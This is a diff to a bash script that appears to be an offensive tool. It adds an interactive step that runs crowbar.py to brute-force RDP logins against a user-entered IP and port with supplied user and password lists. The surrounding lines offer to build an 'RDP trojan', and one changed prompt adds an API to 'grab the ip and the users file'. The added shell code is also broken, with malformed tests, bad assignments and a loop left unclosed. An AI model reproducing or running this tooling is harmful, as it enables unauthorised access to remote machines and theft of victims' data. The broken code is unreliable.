@@ -31,6 +31,33 @@ fi
 
 ./$compiled_script
 
+echo " If you already have the rdp port activated press"
+read -p " (y/n)" crow
+p = 1
+while true
+do
+  if [ "$crow" == "n"]; then
+   break
+  elif [ "$crow" == "y"];then
+    crowbar = 1
+    break
+  elif [ "$crow" != "y"] || [ "$crow" != "n"];then
+    echo " Unvalid answer. Try again"
+
+fi
+  
+if [ "$crowbar" == 1];then
+    read -p "please type in the ip adress" ip1
+    read -p "Please type in the Port" port1
+    read -p "Please type in the user list to brute force" user1
+    read -p " Please type in the password list to brute force" passwd1
+    
+    
+    ./crowbar.py -b rdp -s $ip1/$port1 -U $user1 -C $passwd1 -d
+
+fi
+
+
 read -p "Enter the API address (e.g., https://example.com/api): " api_url
 
 read -p "Do you want to create an RDP trojan? (Y/N): " a1
@@ -38,7 +65,7 @@ read -p "Do you want to create an RDP trojan? (Y/N): " a1
 if [ "$a1" == "N" ]; then
     exit
 elif [ "$a1" == "Y" ]; then
-    echo "Do you want to add advice?"
+    echo "Do you want to add an api to grab the ip and the users file?"
 
     read -p "(Y/N): " a2
 
